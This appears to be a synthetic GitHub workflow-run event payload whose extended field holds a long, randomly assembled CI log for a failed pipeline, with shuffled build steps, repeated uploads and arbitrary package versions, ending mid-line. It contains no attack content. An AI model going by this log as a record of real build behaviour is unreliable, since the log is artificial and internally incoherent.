{
  "action": "completed",
  "workflow_run": {
    "id": 73,
    "name": "CI Pipeline",
    "head_branch": "main",
    "head_sha": "d24bee4c33ef7067b4187d954cdfeb6998b3a819",
    "status": "completed",
    "conclusion": "failure",
    "run_started_at": "2025-12-10T12:00:18.916724Z",
    "updated_at": "2025-12-10T12:03:34.509692Z"
  },
  "repository": {
    "full_name": "acme-corp/web-app",
    "name": "web-app"
  },
  "sender": {
    "login": "alice"
  },
  "_safeops_extended": {
    "raw_logs": "=== Step: upload_artifacts ===\nStep 4/10: Building\nStep 1/10: Building\n  PASS: test_cache_hit (427ms)\nFAILED: test_user_create\n[12:00:18] INFO: Processing request\nStep 7/10: Building\nCompiling src/service.java...\nCache hit for key-6412\n[12:00:18] INFO: Processing request\n\u2713 build completed\nWARNING: jest has known vulnerabilities\nStep 8/10: Building\n\u2713 build completed\nCompiling src/service.java...\n\u2713 build completed\n[12:00:18] INFO: Processing request\n[12:00:18] INFO: Processing request\nStep 9/10: Building\nStep 9/10: Building\nCompiling src/main.py...\n[12:00:18] INFO: Processing request\nArtifact uploaded: build.tar.gz (50MB)\nStep 6/10: Building\n  PASS: test_db_connect (394ms)\nCache hit for key-7130\n  PASS: test_auth_login (499ms)\nCache hit for key-8147\nCache hit for key-5308\nStep 3/10: Building\n\u2713 lint completed\n\u2713 test completed\nCompiling src/app.ts...\nCache hit for key-6578\n[12:00:18] INFO: Processing request\nArtifact uploaded: build.tar.gz (47MB)\nInstalling prettier@4.18.0\nArtifact uploaded: build.tar.gz (42MB)\n[12:00:18] INFO: Processing request\nStep 4/10: Building\nCompiling src/index.js...\nArtifact uploaded: build.tar.gz (49MB)\nStep 3/10: Building\nArtifact uploaded: build.tar.gz (1MB)\n\u2713 build completed\nArtifact uploaded: build.tar.gz (14MB)\n\u2713 lint completed\nStep 3/10: Building\nStep 2/10: Building\nInstalling jest@4.16.0\n[12:00:18] INFO: Processing request\n  PASS: test_db_connect (338ms)\n  PASS: test_user_create (177ms)\nCompiling src/app.ts...\n  PASS: test_api_health (406ms)\nStep 3/10: Building\nException: TypeError\nStep 2/10: Building\n\u2713 lint completed\nStep 10/10: Building\nCache hit for key-2528\nArtifact uploaded: build.tar.gz (38MB)\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n  PASS: test_user_create (161ms)\nArtifact uploaded: build.tar.gz (29MB)\nArtifact uploaded: build.tar.gz (10MB)\nWARNING: express has known vulnerabilities\nStep 8/10: Building\nCompiling src/app.ts...\nCache hit for key-3594\n  PASS: test_user_create (41ms)\nCompiling src/app.ts...\n\u2713 build completed\nCache hit for key-8236\n[12:00:18] INFO: Processing request\nCache hit for key-8842\nCache hit for key-9253\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n[12:00:18] INFO: Processing request\nStep 6/10: Building\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n  PASS: test_cache_hit (271ms)\nInstalling axios@4.9.0\n[12:00:18] INFO: Processing request\n[12:00:18] WARN: Deprecated API usage\nCompiling src/service.java...\nWARNING: axios has known vulnerabilities\nCache hit for key-3567\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nArtifact uploaded: build.tar.gz (13MB)\nWARNING: react has known vulnerabilities\nInstalling webpack@2.3.0\n\u2713 test completed\nStep 6/10: Building\n  PASS: test_auth_login (194ms)\nCompiling src/handler.rs...\n\u2713 test completed\n\u2717 build failed with exit code 40\n[12:00:18] INFO: Processing request\n  PASS: test_auth_login (268ms)\nInstalling eslint@2.12.0\nCompiling src/app.ts...\nCache hit for key-8881\nInstalling prettier@3.12.0\nCompiling src/utils.go...\n[12:00:18] ERROR: Connection failed\n  PASS: test_auth_login (392ms)\n[12:00:18] INFO: Processing request\n[12:00:18] INFO: Processing request\n[12:00:18] WARN: Deprecated API usage\nCache hit for key-7050\nWARNING: lodash has known vulnerabilities\nStep 8/10: Building\nCache hit for key-2369\nCompiling src/handler.rs...\nCache hit for key-6357\nCache hit for key-6973\n  PASS: test_auth_login (342ms)\nCompiling src/app.ts...\n  PASS: test_api_health (138ms)\nStep 2/10: Building\n\u2713 lint completed\n[12:00:18] INFO: Processing request\n[12:00:18] WARN: Deprecated API usage\n\u2717 build failed with exit code 5\n[12:00:18] INFO: Processing request\nFAILED: test_user_create\nCompiling src/utils.go...\n[12:00:18] INFO: Processing request\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nStep 4/10: Building\nStep 7/10: Building\nWARNING: axios has known vulnerabilities\n  PASS: test_cache_hit (132ms)\nCache hit for key-3528\nStep 2/10: Building\nArtifact uploaded: build.tar.gz (17MB)\nStep 5/10: Building\nArtifact uploaded: build.tar.gz (5MB)\nInstalling jest@3.8.0\nArtifact uploaded: build.tar.gz (24MB)\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n\u2713 lint completed\n[12:00:18] INFO: Processing request\n[12:00:18] INFO: Processing request\nInstalling react@5.2.0\nArtifact uploaded: build.tar.gz (34MB)\n  PASS: test_api_health (49ms)\n[12:00:18] WARN: Deprecated API usage\n  PASS: test_user_create (190ms)\nInstalling jest@3.9.0\nInstalling lodash@1.4.0\n\u2713 lint completed\nArtifact uploaded: build.tar.gz (15MB)\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nCompiling src/index.js...\nArtifact uploaded: build.tar.gz (50MB)\nCache hit for key-3074\nCache hit for key-9515\nInstalling lodash@4.1.0\nCompiling src/index.js...\nInstalling eslint@5.18.0\n\u2713 build completed\nCache hit for key-2881\nInstalling express@2.0.0\n  PASS: test_user_create (269ms)\nCache hit for key-2255\nCompiling src/handler.rs...\n\u2713 build completed\nWARNING: express has known vulnerabilities\nInstalling axios@3.5.0\n=== Step upload_artifacts completed ===\n=== Step: save_cache ===\nCompiling src/main.py...\nCache hit for key-3370\n\u2713 lint completed\nStep 4/10: Building\nArtifact uploaded: build.tar.gz (5MB)\n[12:00:18] INFO: Processing request\nInstalling react@4.20.0\nInstalling prettier@1.10.0\nCache hit for key-3977\nStep 9/10: Building\nStep 1/10: Building\nArtifact uploaded: build.tar.gz (9MB)\nStep 6/10: Building\nArtifact uploaded: build.tar.gz (31MB)\n[12:00:18] INFO: Processing request\nArtifact uploaded: build.tar.gz (38MB)\nCache hit for key-6442\n  PASS: test_user_create (324ms)\n[12:00:18] ERROR: Connection failed\nInstalling eslint@4.19.0\nCache hit for key-5887\nCompiling src/utils.go...\nInstalling axios@4.14.0\nArtifact uploaded: build.tar.gz (28MB)\nInstalling express@3.12.0\nStep 1/10: Building\nCache hit for key-7834\n  PASS: test_auth_login (323ms)\n  PASS: test_api_health (330ms)\n\u2713 test completed\nInstalling axios@2.19.0\nException: ValueError\n\u2713 build completed\nCompiling src/service.java...\n  PASS: test_user_create (213ms)\nInstalling axios@2.1.0\n\u2713 lint completed\nArtifact uploaded: build.tar.gz (40MB)\nCompiling src/app.ts...\nCache hit for key-2934\nStep 5/10: Building\n\u2713 lint completed\n\u2713 lint completed\nCache hit for key-5677\nCompiling src/service.java...\nCompiling src/service.java...\nCompiling src/utils.go...\n\u2713 build completed\nArtifact uploaded: build.tar.gz (2MB)\nInstalling react@2.11.0\n[12:00:18] INFO: Processing request\nStep 7/10: Building\nStep 10/10: Building\n\u2713 lint completed\nStep 5/10: Building\n\u2713 lint completed\nStep 8/10: Building\nFAILED: test_auth_login\nCompiling src/service.java...\nInstalling eslint@1.11.0\nStep 8/10: Building\n\u2713 lint completed\n\u2713 build completed\n\u2713 lint completed\n  PASS: test_auth_login (335ms)\nStep 9/10: Building\nCache hit for key-7431\nArtifact uploaded: build.tar.gz (10MB)\nStep 9/10: Building\nStep 4/10: Building\nArtifact uploaded: build.tar.gz (28MB)\n  PASS: test_user_create (246ms)\nInstalling react@5.18.0\n  PASS: test_api_health (381ms)\nArtifact uploaded: build.tar.gz (35MB)\nArtifact uploaded: build.tar.gz (48MB)\nCompiling src/utils.go...\nCompiling src/main.py...\nStep 1/10: Building\nCompiling src/handler.rs...\nArtifact uploaded: build.tar.gz (31MB)\nCache hit for key-8507\n  PASS: test_db_connect (11ms)\n[12:00:18] INFO: Processing request\nStep 1/10: Building\nInstalling express@3.16.0\n  PASS: test_cache_hit (100ms)\nArtifact uploaded: build.tar.gz (17MB)\nWARNING: express has known vulnerabilities\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nInstalling eslint@1.14.0\n[12:00:18] INFO: Processing request\n  PASS: test_user_create (220ms)\n[12:00:18] INFO: Processing request\nCompiling src/main.py...\n[12:00:18] INFO: Processing request\nArtifact uploaded: build.tar.gz (49MB)\nCompiling src/utils.go...\nArtifact uploaded: build.tar.gz (38MB)\n  PASS: test_cache_hit (262ms)\n\u2713 test completed\nCompiling src/main.py...\nStep 6/10: Building\n\u2713 test completed\nArtifact uploaded: build.tar.gz (20MB)\n[12:00:18] INFO: Processing request\n\u2713 build completed\nInstalling eslint@3.2.0\nArtifact uploaded: build.tar.gz (17MB)\n\u2713 lint completed\n\u2713 test completed\n[12:00:18] WARN: Deprecated API usage\n\u2713 build completed\nInstalling webpack@2.14.0\nCompiling src/handler.rs...\nInstalling jest@4.2.0\nCache hit for key-2125\n[12:00:18] INFO: Processing request\n\u2713 lint completed\n[12:00:18] INFO: Processing request\nCache hit for key-3464\n[12:00:18] WARN: Deprecated API usage\nArtifact uploaded: build.tar.gz (3MB)\n[12:00:18] INFO: Processing request\nCache hit for key-7790\n\u2713 test completed\nInstalling express@5.6.0\nArtifact uploaded: build.tar.gz (38MB)\n  PASS: test_user_create (400ms)\nCompiling src/utils.go...\n[12:00:18] INFO: Processing request\n[12:00:18] INFO: Processing request\n[12:00:18] INFO: Processing request\n[12:00:18] INFO: Processing request\nInstalling express@5.12.0\nStep 5/10: Building\nWARNING: webpack has known vulnerabilities\nInstalling eslint@5.5.0\nArtifact uploaded: build.tar.gz (9MB)\nWARNING: jest has known vulnerabilities\n\u2713 test completed\n\u2713 test completed\nCompiling src/app.ts...\nCompiling src/app.ts...\nCache hit for key-9155\n\u2713 lint completed\nArtifact uploaded: build.tar.gz (13MB)\n[12:00:18] INFO: Processing request\nStep 4/10: Building\nStep 1/10: Building\n\u2713 test completed\nCache hit for key-2305\n[12:00:18] INFO: Processing request\nCompiling src/app.ts...\n  PASS: test_user_create (148ms)\nStep 6/10: Building\n[12:00:18] INFO: Processing request\nInstalling prettier@2.20.0\nStep 1/10: Building\nWARNING: eslint has known vulnerabilities\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nCompiling src/handler.rs...\nStep 5/10: Building\nArtifact uploaded: build.tar.gz (28MB)\nCompiling src/app.ts...\nCompiling src/utils.go...\n\u2713 build completed\nStep 8/10: Building\nInstalling axios@5.1.0\nCache hit for key-7164\n=== Step save_cache completed ===\n=== Step: e2e_tests ===\n  PASS: test_cache_hit (399ms)\nCache hit for key-8498\n  PASS: test_cache_hit (158ms)\n[12:00:18] WARN: Deprecated API usage\nArtifact uploaded: build.tar.gz (28MB)\n  PASS: test_cache_hit (333ms)\n  PASS: test_user_create (305ms)\nStep 3/10: Building\nCache hit for key-8793\nCache hit for key-5637\nCompiling src/utils.go...\n[12:00:18] INFO: Processing request\nCompiling src/app.ts...\nArtifact uploaded: build.tar.gz (46MB)\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nInstalling react@2.20.0\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nStep 10/10: Building\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nArtifact uploaded: build.tar.gz (3MB)\n\u2713 build completed\n  PASS: test_auth_login (178ms)\nCompiling src/index.js...\n\u2713 lint completed\n\u2713 build completed\nCache hit for key-5808\nStep 9/10: Building\nCache hit for key-4313\nCompiling src/app.ts...\n\u2713 test completed\nInstalling lodash@5.13.0\n  PASS: test_cache_hit (366ms)\nStep 2/10: Building\nInstalling webpack@3.7.0\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n  PASS: test_user_create (353ms)\nInstalling express@1.3.0\nInstalling webpack@1.3.0\n  PASS: test_db_connect (227ms)\n  PASS: test_db_connect (338ms)\nArtifact uploaded: build.tar.gz (6MB)\nStep 5/10: Building\nCache hit for key-1107\nCompiling src/index.js...\n\u2713 lint completed\n  PASS: test_auth_login (44ms)\nArtifact uploaded: build.tar.gz (48MB)\n\u2713 test completed\nStep 5/10: Building\nCompiling src/index.js...\n[12:00:18] INFO: Processing request\n  PASS: test_db_connect (331ms)\nWARNING: prettier has known vulnerabilities\nStep 7/10: Building\n[12:00:18] ERROR: Connection failed\n  PASS: test_db_connect (306ms)\nArtifact uploaded: build.tar.gz (17MB)\n\u2713 test completed\nArtifact uploaded: build.tar.gz (45MB)\nStep 1/10: Building\nCache hit for key-2841\nArtifact uploaded: build.tar.gz (16MB)\nStep 10/10: Building\n\u2713 lint completed\nArtifact uploaded: build.tar.gz (25MB)\nArtifact uploaded: build.tar.gz (11MB)\nCompiling src/app.ts...\n  PASS: test_user_create (85ms)\n[12:00:18] INFO: Processing request\nCache hit for key-5678\nCompiling src/app.ts...\n\u2713 build completed\nInstalling jest@2.11.0\nStep 9/10: Building\nArtifact uploaded: build.tar.gz (45MB)\nStep 6/10: Building\n  PASS: test_db_connect (311ms)\n\u2713 lint completed\n[12:00:18] INFO: Processing request\nArtifact uploaded: build.tar.gz (11MB)\n\u2713 test completed\nWARNING: eslint has known vulnerabilities\n\u2713 lint completed\nStep 4/10: Building\n\u2713 build completed\n  PASS: test_cache_hit (432ms)\n  PASS: test_cache_hit (417ms)\nInstalling react@1.5.0\n[12:00:18] INFO: Processing request\nCache hit for key-8474\nInstalling express@2.6.0\nCache hit for key-3597\n[12:00:18] WARN: Deprecated API usage\n[12:00:18] WARN: Deprecated API usage\n  PASS: test_cache_hit (288ms)\nStep 7/10: Building\n[12:00:18] INFO: Processing request\n[12:00:18] WARN: Deprecated API usage\nInstalling webpack@5.12.0\nArtifact uploaded: build.tar.gz (9MB)\n  PASS: test_db_connect (426ms)\n[12:00:18] INFO: Processing request\nCompiling src/main.py...\nInstalling jest@2.14.0\nInstalling prettier@3.10.0\nInstalling webpack@5.13.0\nCache hit for key-5885\n[12:00:18] INFO: Processing request\nInstalling webpack@5.14.0\n  PASS: test_cache_hit (434ms)\nCompiling src/index.js...\n\u2713 build completed\nCache hit for key-7837\n[12:00:18] INFO: Processing request\nArtifact uploaded: build.tar.gz (21MB)\n[12:00:18] INFO: Processing request\nInstalling prettier@5.1.0\nArtifact uploaded: build.tar.gz (25MB)\n[12:00:18] INFO: Processing request\nCache hit for key-6281\n\u2713 build completed\n\u2713 build completed\n[12:00:18] WARN: Deprecated API usage\nArtifact uploaded: build.tar.gz (30MB)\nArtifact uploaded: build.tar.gz (5MB)\nCompiling src/handler.rs...\n[12:00:18] INFO: Processing request\nStep 5/10: Building\nFAILED: test_auth_login\n[12:00:18] WARN: Deprecated API usage\nCache hit for key-1076\n[12:00:18] INFO: Processing request\n[12:00:18] INFO: Processing request\nCompiling src/app.ts...\n  PASS: test_api_health (431ms)\nStep 8/10: Building\n  PASS: test_db_connect (409ms)\nInstalling jest@3.0.0\nCompiling src/utils.go...\nCache hit for key-4855\nStep 6/10: Building\nCompiling src/app.ts...\n[12:00:18] INFO: Processing request\nCache hit for key-3132\n\u2713 test completed\nInstalling webpack@5.10.0\n[12:00:18] WARN: Deprecated API usage\n\u2713 lint completed\nCache hit for key-8359\n\u2713 lint completed\n  PASS: test_cache_hit (337ms)\n  PASS: test_api_health (149ms)\nCache hit for key-7413\n  PASS: test_api_health (279ms)\nInstalling eslint@4.14.0\n  PASS: test_api_health (389ms)\nArtifact uploaded: build.tar.gz (4MB)\n  PASS: test_auth_login (248ms)\n\u2713 build completed\nCache hit for key-4139\nInstalling jest@5.15.0\n[12:00:18] INFO: Processing request\nCache hit for key-2780\nCompiling src/utils.go...\n  PASS: test_db_connect (174ms)\nCache hit for key-1663\nInstalling jest@1.11.0\nArtifact uploaded: build.tar.gz (35MB)\nStep 5/10: Building\nCompiling src/handler.rs...\n=== Step e2e_tests completed ===\n=== Step: type_check ===\nArtifact uploaded: build.tar.gz (3MB)\n\u2713 lint completed\nCompiling src/service.java...\nStep 9/10: Building\nInstalling react@5.7.0\nInstalling lodash@5.18.0\nInstalling webpack@1.1.0\nInstalling lodash@4.3.0\n\u2713 build completed\nCompiling src/app.ts...\nStep 3/10: Building\nArtifact uploaded: build.tar.gz (45MB)\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n  PASS: test_db_connect (101ms)\n\u2713 build completed\nCache hit for key-5196\n  PASS: test_cache_hit (492ms)\n\u2713 lint completed\nInstalling axios@3.0.0\nCompiling src/service.java...\n[12:00:18] INFO: Processing request\n\u2713 build completed\nArtifact uploaded: build.tar.gz (22MB)\nInstalling prettier@5.9.0\nCache hit for key-5775\n\u2713 test completed\nCompiling src/service.java...\nInstalling react@3.10.0\n[12:00:18] INFO: Processing request\nFAILED: test_user_create\n[12:00:18] INFO: Processing request\nInstalling jest@4.11.0\n  PASS: test_cache_hit (87ms)\n  PASS: test_auth_login (145ms)\nCache hit for key-3441\nWARNING: react has known vulnerabilities\n[12:00:18] INFO: Processing request\nCache hit for key-9942\nStep 8/10: Building\nCompiling src/app.ts...\nCompiling src/app.ts...\nCompiling src/utils.go...\n[12:00:18] INFO: Processing request\n\u2713 lint completed\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nArtifact uploaded: build.tar.gz (4MB)\nCompiling src/utils.go...\nCompiling src/main.py...\nCompiling src/index.js...\nWARNING: express has known vulnerabilities\n\u2713 build completed\nCache hit for key-6377\nStep 1/10: Building\nStep 5/10: Building\n\u2713 test completed\nArtifact uploaded: build.tar.gz (26MB)\n  PASS: test_auth_login (63ms)\nCompiling src/service.java...\nCompiling src/index.js...\n[12:00:18] INFO: Processing request\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nCache hit for key-8153\nArtifact uploaded: build.tar.gz (33MB)\n[12:00:18] INFO: Processing request\n\u2713 test completed\nArtifact uploaded: build.tar.gz (31MB)\nFAILED: test_auth_login\nInstalling webpack@2.15.0\nInstalling prettier@1.18.0\n\u2713 lint completed\n  PASS: test_cache_hit (26ms)\n\u2713 test completed\nCache hit for key-5009\n[12:00:18] INFO: Processing request\n  PASS: test_user_create (499ms)\nStep 8/10: Building\n[12:00:18] INFO: Processing request\nCompiling src/utils.go...\n\u2713 test completed\n[12:00:18] INFO: Processing request\n\u2713 test completed\n  PASS: test_cache_hit (427ms)\n[12:00:18] INFO: Processing request\nCompiling src/service.java...\nArtifact uploaded: build.tar.gz (46MB)\nArtifact uploaded: build.tar.gz (34MB)\nArtifact uploaded: build.tar.gz (5MB)\n[12:00:18] WARN: Deprecated API usage\n\u2713 lint completed\n  PASS: test_user_create (17ms)\nArtifact uploaded: build.tar.gz (19MB)\nCompiling src/handler.rs...\nStep 1/10: Building\nArtifact uploaded: build.tar.gz (30MB)\nCompiling src/utils.go...\nArtifact uploaded: build.tar.gz (21MB)\nWARNING: prettier has known vulnerabilities\nStep 7/10: Building\nStep 3/10: Building\n\u2713 lint completed\n  PASS: test_cache_hit (35ms)\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nCompiling src/handler.rs...\nCache hit for key-5900\nInstalling lodash@2.11.0\nInstalling webpack@3.10.0\nCache hit for key-7518\nStep 10/10: Building\n\u2713 build completed\nInstalling jest@2.5.0\nInstalling webpack@3.20.0\n\u2713 build completed\n  PASS: test_auth_login (317ms)\nInstalling jest@2.7.0\nArtifact uploaded: build.tar.gz (27MB)\n[12:00:18] INFO: Processing request\nCompiling src/main.py...\nCompiling src/service.java...\nStep 1/10: Building\nCache hit for key-2728\nStep 10/10: Building\n  PASS: test_db_connect (130ms)\nStep 9/10: Building\nInstalling react@1.20.0\nInstalling jest@3.13.0\nInstalling lodash@4.20.0\nInstalling react@1.18.0\nCompiling src/handler.rs...\n[12:00:18] INFO: Processing request\nCache hit for key-1527\n  PASS: test_db_connect (286ms)\n  PASS: test_user_create (130ms)\n\u2713 lint completed\n[12:00:18] INFO: Processing request\nInstalling express@4.17.0\nArtifact uploaded: build.tar.gz (42MB)\nFAILED: test_api_health\nArtifact uploaded: build.tar.gz (46MB)\nStep 8/10: Building\nStep 3/10: Building\n\u2713 test completed\nCompiling src/main.py...\n  PASS: test_db_connect (34ms)\nCache hit for key-6305\nInstalling express@2.14.0\nWARNING: express has known vulnerabilities\n\u2713 build completed\nStep 1/10: Building\nStep 1/10: Building\nInstalling react@5.12.0\nArtifact uploaded: build.tar.gz (48MB)\n[12:00:18] INFO: Processing request\nArtifact uploaded: build.tar.gz (11MB)\n  PASS: test_api_health (211ms)\nWARNING: react has known vulnerabilities\nArtifact uploaded: build.tar.gz (23MB)\nArtifact uploaded: build.tar.gz (49MB)\nCompiling src/utils.go...\nArtifact uploaded: build.tar.gz (49MB)\n  PASS: test_cache_hit (181ms)\nArtifact uploaded: build.tar.gz (24MB)\nInstalling express@1.4.0\nCompiling src/main.py...\nArtifact uploaded: build.tar.gz (36MB)\nInstalling webpack@4.9.0\nStep 8/10: Building\nCompiling src/service.java...\nCompiling src/service.java...\nCache hit for key-8303\nCompiling src/utils.go...\n=== Step type_check completed ===\n=== Step: restore_cache ===\nInstalling eslint@2.2.0\n\u2713 build completed\nCompiling src/handler.rs...\nStep 6/10: Building\nArtifact uploaded: build.tar.gz (16MB)\n[12:00:18] INFO: Processing request\nCache hit for key-8323\n\u2717 build failed with exit code 90\nInstalling react@3.0.0\n  PASS: test_db_connect (97ms)\nInstalling eslint@1.3.0\nCache hit for key-1479\n  PASS: test_cache_hit (312ms)\n[12:00:18] INFO: Processing request\n[12:00:18] INFO: Processing request\nCache hit for key-8014\nArtifact uploaded: build.tar.gz (22MB)\n[12:00:18] INFO: Processing request\nCache hit for key-5778\nCompiling src/handler.rs...\nCache hit for key-1068\nCompiling src/handler.rs...\nArtifact uploaded: build.tar.gz (42MB)\n\u2713 test completed\nCache hit for key-2218\nWARNING: jest has known vulnerabilities\nCache hit for key-2076\nArtifact uploaded: build.tar.gz (21MB)\n[12:00:18] INFO: Processing request\nArtifact uploaded: build.tar.gz (2MB)\nCompiling src/app.ts...\nStep 10/10: Building\n[12:00:18] INFO: Processing request\n[12:00:18] INFO: Processing request\nStep 10/10: Building\n  PASS: test_cache_hit (46ms)\nStep 2/10: Building\nCache hit for key-6762\n  PASS: test_user_create (180ms)\nArtifact uploaded: build.tar.gz (36MB)\nArtifact uploaded: build.tar.gz (32MB)\nCompiling src/utils.go...\nCompiling src/service.java...\nArtifact uploaded: build.tar.gz (16MB)\n  PASS: test_api_health (124ms)\nStep 9/10: Building\nCache hit for key-6029\nArtifact uploaded: build.tar.gz (42MB)\n  PASS: test_cache_hit (158ms)\n  PASS: test_auth_login (427ms)\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n\u2713 lint completed\n\u2713 build completed\n\u2717 build failed with exit code 42\nInstalling prettier@1.16.0\n  PASS: test_api_health (293ms)\nArtifact uploaded: build.tar.gz (47MB)\nCompiling src/app.ts...\n\u2717 build failed with exit code 72\n\u2717 build failed with exit code 5\nArtifact uploaded: build.tar.gz (28MB)\nInstalling jest@2.16.0\n  PASS: test_api_health (153ms)\nArtifact uploaded: build.tar.gz (21MB)\n  PASS: test_user_create (446ms)\nInstalling webpack@1.0.0\nInstalling lodash@2.2.0\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nCache hit for key-2817\nCache hit for key-6259\nCompiling src/app.ts...\nInstalling react@3.13.0\nArtifact uploaded: build.tar.gz (43MB)\nCompiling src/handler.rs...\nCache hit for key-5151\nCompiling src/service.java...\nStep 4/10: Building\n[12:00:18] WARN: Deprecated API usage\n  PASS: test_api_health (94ms)\nInstalling webpack@4.19.0\nStep 4/10: Building\n[12:00:18] INFO: Processing request\nStep 8/10: Building\n\u2713 build completed\nInstalling axios@5.1.0\n\u2713 test completed\n[12:00:18] INFO: Processing request\n[12:00:18] INFO: Processing request\nInstalling prettier@5.16.0\nCompiling src/index.js...\n\u2713 test completed\nCache hit for key-3368\n\u2713 build completed\nCompiling src/app.ts...\nInstalling jest@3.11.0\nInstalling express@5.4.0\nCache hit for key-9922\n[12:00:18] INFO: Processing request\n[12:00:18] INFO: Processing request\n[12:00:18] INFO: Processing request\n\u2713 build completed\n[12:00:18] INFO: Processing request\nCompiling src/app.ts...\nCache hit for key-6839\nInstalling axios@3.17.0\nStep 8/10: Building\nCompiling src/index.js...\nStep 3/10: Building\nCache hit for key-1084\nStep 2/10: Building\n  PASS: test_api_health (246ms)\n[12:00:18] INFO: Processing request\n[12:00:18] INFO: Processing request\nCache hit for key-2764\nFAILED: test_auth_login\nStep 4/10: Building\n[12:00:18] INFO: Processing request\nInstalling lodash@2.5.0\nCompiling src/main.py...\n\u2713 lint completed\nCompiling src/app.ts...\n\u2713 build completed\nArtifact uploaded: build.tar.gz (50MB)\n\u2713 build completed\nInstalling jest@1.7.0\n\u2713 lint completed\nCompiling src/main.py...\nArtifact uploaded: build.tar.gz (18MB)\nCache hit for key-9456\n  PASS: test_auth_login (255ms)\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nCache hit for key-7587\nStep 6/10: Building\nArtifact uploaded: build.tar.gz (34MB)\nInstalling react@5.3.0\n[12:00:18] INFO: Processing request\nInstalling lodash@4.4.0\n[12:00:18] INFO: Processing request\n\u2717 build failed with exit code 56\nCompiling src/handler.rs...\n\u2713 lint completed\nCache hit for key-6526\nCompiling src/main.py...\nStep 10/10: Building\nCompiling src/app.ts...\n[12:00:18] INFO: Processing request\nArtifact uploaded: build.tar.gz (34MB)\nCache hit for key-2710\n  PASS: test_api_health (307ms)\nInstalling express@4.1.0\nCompiling src/app.ts...\nStep 3/10: Building\n\u2713 build completed\nStep 6/10: Building\nStep 1/10: Building\nCompiling src/service.java...\nInstalling webpack@4.1.0\n\u2713 build completed\n\u2713 lint completed\nCompiling src/main.py...\nInstalling react@5.10.0\nCache hit for key-3943\n  PASS: test_cache_hit (103ms)\n  PASS: test_api_health (253ms)\nStep 6/10: Building\nStep 1/10: Building\n[12:00:18] INFO: Processing request\n\u2717 build failed with exit code 93\n\u2713 lint completed\nCache hit for key-2222\n=== Step restore_cache completed ===\n=== Step: install_dependencies ===\n[12:00:18] INFO: Processing request\n[12:00:18] INFO: Processing request\nArtifact uploaded: build.tar.gz (40MB)\nException: ValueError\n[12:00:18] INFO: Processing request\n\u2713 lint completed\nArtifact uploaded: build.tar.gz (1MB)\n[12:00:18] INFO: Processing request\n[12:00:18] INFO: Processing request\nException: ValueError\n[12:00:18] INFO: Processing request\nStep 10/10: Building\nStep 7/10: Building\n[12:00:18] INFO: Processing request\nArtifact uploaded: build.tar.gz (19MB)\n\u2713 lint completed\n[12:00:18] INFO: Processing request\nException: ValueError\nCompiling src/handler.rs...\nCompiling src/handler.rs...\n  PASS: test_api_health (307ms)\n  PASS: test_auth_login (474ms)\n  PASS: test_db_connect (79ms)\nCache hit for key-6704\nStep 5/10: Building\n  PASS: test_api_health (240ms)\nInstalling webpack@4.15.0\nStep 1/10: Building\nStep 9/10: Building\n  PASS: test_api_health (270ms)\n[12:00:18] INFO: Processing request\nStep 3/10: Building\n[12:00:18] WARN: Deprecated API usage\n\u2713 test completed\n[12:00:18] INFO: Processing request\nStep 9/10: Building\nInstalling webpack@4.18.0\nCache hit for key-3154\nArtifact uploaded: build.tar.gz (29MB)\nCache hit for key-4392\n\u2713 lint completed\nCompiling src/index.js...\nInstalling eslint@1.2.0\nStep 2/10: Building\nArtifact uploaded: build.tar.gz (10MB)\n  PASS: test_api_health (186ms)\nArtifact uploaded: build.tar.gz (34MB)\nStep 5/10: Building\nCache hit for key-5989\n  PASS: test_cache_hit (40ms)\nArtifact uploaded: build.tar.gz (6MB)\nCompiling src/service.java...\nInstalling eslint@5.4.0\nCache hit for key-6112\nCompiling src/index.js...\n  PASS: test_user_create (403ms)\n[12:00:18] WARN: Deprecated API usage\nCompiling src/index.js...\n  PASS: test_db_connect (180ms)\nInstalling prettier@3.2.0\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n  PASS: test_user_create (333ms)\nArtifact uploaded: build.tar.gz (28MB)\nCompiling src/utils.go...\n  PASS: test_cache_hit (2ms)\nInstalling express@3.2.0\n[12:00:18] INFO: Processing request\n  PASS: test_cache_hit (284ms)\n\u2713 build completed\n  PASS: test_api_health (412ms)\nCache hit for key-7054\n\u2713 lint completed\n\u2713 test completed\nStep 5/10: Building\n  PASS: test_db_connect (252ms)\nCompiling src/utils.go...\n  PASS: test_user_create (486ms)\nCompiling src/index.js...\n[12:00:18] ERROR: Connection failed\nCompiling src/app.ts...\n  PASS: test_api_health (480ms)\nArtifact uploaded: build.tar.gz (6MB)\nInstalling express@4.18.0\n  PASS: test_cache_hit (311ms)\n[12:00:18] INFO: Processing request\n  PASS: test_user_create (336ms)\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nArtifact uploaded: build.tar.gz (44MB)\nArtifact uploaded: build.tar.gz (15MB)\nCompiling src/service.java...\nCompiling src/app.ts...\nInstalling eslint@3.13.0\n  PASS: test_api_health (181ms)\nArtifact uploaded: build.tar.gz (7MB)\nCompiling src/app.ts...\nWARNING: axios has known vulnerabilities\n[12:00:18] INFO: Processing request\n  PASS: test_cache_hit (311ms)\nInstalling eslint@3.7.0\nArtifact uploaded: build.tar.gz (31MB)\nCompiling src/handler.rs...\n  PASS: test_auth_login (208ms)\nArtifact uploaded: build.tar.gz (14MB)\nCompiling src/main.py...\nCache hit for key-3713\n  PASS: test_cache_hit (236ms)\n  PASS: test_auth_login (404ms)\n[12:00:18] INFO: Processing request\nCompiling src/app.ts...\nInstalling webpack@1.9.0\nCache hit for key-6841\nCompiling src/main.py...\n[12:00:18] INFO: Processing request\nArtifact uploaded: 